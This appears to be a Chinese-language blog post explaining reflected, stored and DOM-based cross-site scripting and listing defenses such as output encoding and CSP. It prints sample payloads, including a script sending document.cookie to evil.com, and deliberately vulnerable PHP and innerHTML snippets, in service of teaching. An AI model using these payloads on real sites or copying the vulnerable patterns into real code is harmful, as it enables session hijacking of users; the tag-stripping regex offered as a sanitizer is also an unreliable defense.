---
title: XSS（Cross-Site Scripting，跨站腳本攻擊） 介紹與防禦方法
date: 2025-02-09 21:59:32
tags:
- XSS
- 前端
- 資安
categories: 資安
---
XSS（跨站腳本攻擊）的核心原理是 **攻擊者設法將惡意 JavaScript 代碼注入到合法網站的 HTML 內**，使受害者的瀏覽器執行這段代碼，進而竊取Cookie、劫持Session或其他攻擊。

這通常透過以下方式達成：

1. **反射型 XSS（Reflected XSS）**
2. **儲存型 XSS（Stored XSS）**
3. **DOM 型 XSS（DOM-based XSS）**

---

# **反射型 XSS（Reflected XSS）**

最常見的 XSS 攻擊類型，攻擊者將惡意代碼嵌入 URL 或請求參數，利用社交工程釣魚的技巧，當受害者打開該連結時，網站會直接回應並執行這段代碼。

### **攻擊流程**

1. **攻擊者構造惡意 URL**，例如：
    
    ```
    https://example.com/search?query=<script>alert('XSS')</script>
    ```
    
2. **網站回應時直接插入該參數值**：
    
    ```
    <p>您搜尋的關鍵字是：<%= request.getParameter("query") %></p>
    ```
    
3. **透過社交工程手法，受害者點擊該 URL，瀏覽器解析後執行惡意 JavaScript**，彈出 `alert('XSS')`，或更惡意的：

攻擊者可竊取使用者的 Session Cookie，進行 **帳號劫持**。
    
    ```jsx
    <script>
        fetch('https://evil.com/steal?cookie=' + document.cookie);
    </script>
    ```
    

---

# **儲存型 XSS（Stored XSS）**

攻擊者將惡意代碼儲存到網站的資料庫，當其他用戶瀏覽時，這段代碼會自動執行。

### **攻擊流程**

1. **攻擊者在網站的可輸入區域提交惡意代碼**：
    
    ```html
    <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
    ```
    
2. **網站將該內容儲存到資料庫**，如：
    
    ```sql
    INSERT INTO comments (user, content) VALUES ('hacker', '<script>...</script>');
    ```
    
3. **當其他用戶瀏覽該頁面時，瀏覽器解析並執行惡意 JavaScript**。

### **攻擊範例**

如果留言板程式如下：

```php
<?php
echo "<p>使用者留言：" . $_POST['comment'] . "</p>";
?>
```

攻擊者提交：

```
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

當其他用戶查看留言時，這段腳本就會竊取他們的 Cookie，導致 **Session 劫持**。

1. **避免 `innerHTML`，使用 `textContent`**

---

# **DOM 型 XSS（DOM-based XSS）**

此手法和反射型 XSS一樣，都需要使用社交工程釣魚的技巧，使 User 點擊 URL 攻擊才會生效。

### **攻擊流程**

1. **攻擊者提供惡意的 URL**
    
    ```
    https://example.com/#<script>alert('XSS')</script>
    ```
    
2. **網站讀取 URL 片段並插入 DOM**
    
    ```
    document.getElementById('result').innerHTML = location.hash;
    ```
    
3. **導致 JavaScript 被執行**
    
    ```html
    <script>alert('XSS')</script>
    ```
    

---

## **總結 & 該如何防禦?**

| XSS 類型 | 攻擊方式 | 防禦方法 |
| --- | --- | --- |
| **反射型 XSS** | 透過 URL 參數傳遞惡意腳本 | HTML 轉義、CSP |
| **儲存型 XSS** | 惡意腳本儲存在伺服器 | HTML 轉義、CSP |
| **DOM 型 XSS** | 前端 JavaScript 操作 DOM，導致腳本執行 | 避免 `innerHTML`，使用 `textContent` |

透過正確的輸入驗證、HTML 轉義、CSP 限制等措施，可以有效防止 XSS 攻擊。 

### **1. 輸入驗證與過濾**

對所有用戶輸入進行驗證和過濾，尤其是涉及 HTML 標籤或 JavaScript 的輸入。

示例：

```jsx
const sanitizeInput = (input) => {
  return input.replace(/<[^>]*>?/gm, ''); // 移除所有 HTML 標籤
};

```
---

### **2. 輸出編碼**

在輸出到網頁前將資料進行編碼，防止瀏覽器將其當作 HTML 或 JavaScript 執行。

示例：前端使用編碼函數

```jsx
const escapeHTML = (str) => {
  const div = document.createElement('div');
  div.appendChild(document.createTextNode(str));
  return div.innerHTML;
};
const safeOutput = escapeHTML(userInput); // 防止 XSS

```
---

### **3. 使用內容安全策略 (CSP)**

透過 CSP 限制瀏覽器允許的資源來源，防止惡意腳本執行。

```
Content-Security-Policy: script-src 'self';
```
---

### **4. 避免直接插入 HTML**

使用框架的模板引擎（如 React、Vue、Angular），這些框架會自動進行 XSS 防禦。